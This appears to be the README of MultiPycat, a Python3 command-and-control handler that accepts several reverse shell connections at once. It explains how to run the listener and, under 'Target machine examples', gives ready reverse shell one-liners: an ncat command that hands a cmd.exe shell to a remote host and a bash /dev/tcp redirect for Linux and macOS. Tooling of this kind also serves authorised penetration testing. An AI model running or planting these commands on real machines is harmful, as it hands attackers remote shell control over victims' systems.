# MultiPycat
Multiple reverse shell connections handler written in Python3.

<img src="https://github.com/tomelic/MultiPycat/blob/master/example.png" width="500" height="300">

# Features
* Simultaneously accept multiple reverse shell connections from different devices
* Interacting with connections and going back and forth to the main interface
* Simplistically written in Python3
* No external dependencies or libraries

# Usage
Install `python3` or use the executable in the releases section

Run on C2 (Tested on Windows and Linux)
```
python3 MultiPycat.py <LISTENING PORT>
MultiPycat> help
```

Target machine examples
```
# windows
ncat <HOST> <PORT> -e cmd.exe

# linux/ macOS
bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1 &
```
